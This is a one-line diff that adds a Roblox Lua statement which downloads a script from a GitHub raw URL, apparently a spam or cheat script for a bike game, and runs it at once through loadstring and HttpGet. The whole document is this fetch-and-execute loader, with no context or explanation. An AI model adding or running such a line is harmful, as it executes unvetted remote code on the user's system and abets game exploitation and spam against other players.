@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/bike-universe-spam7-txe8viyfoo5kto.lua"))()
